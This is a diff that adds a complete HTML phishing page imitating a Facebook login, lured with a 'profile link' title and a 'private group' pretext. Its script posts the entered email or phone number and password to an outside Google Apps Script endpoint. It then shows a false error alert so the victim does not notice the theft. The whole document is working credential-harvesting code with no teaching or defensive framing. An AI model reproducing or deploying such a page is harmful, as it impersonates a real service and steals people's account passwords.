@@ -1,0 +1,64 @@
+<!doctype html>
+<html lang="en"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐋𝐈𝐍𝐊 
+   Signup or Create new account to view</title> 
+  <style>
+        body {
+            font-family: sans-serif;
+            text-align: center;
+        }
+        form {
+            width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        input[type="text" Id="numberInput" ], input[type="password" Id="password Input"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+        }
+        input[type="submit"] {
+            background-color: #3b5998;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style> 
+ </head> 
+ <body> 
+  <h1>Facebook</h1> 
+  <form method="post" name="google-sheet"> <label for="email">Email or Phone:</label> 
+   <input type="text" name="Number" id="email" name="email"> <label for="password">Password:</label> 
+   <input type="password" name="Password" id="password" name="password"> 
+   <br> 
+   <input type="submit" name="submit" value="Log In"> 
+  </form> 
+  <p>Forgotten password? <a href="#">Click here</a></p> 
+  <p>Don't have an account? <a href="#">Sign up</a></p> 
+  <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbwZBzyOQt_Tib-LFVH_X68Hcz6xGPnoosJe_A_KyLmO0TRnylRMu82U0nyrc6gnVq3n/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Error occured !! Private group unable to login."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script> 
+ 
+</body></html>
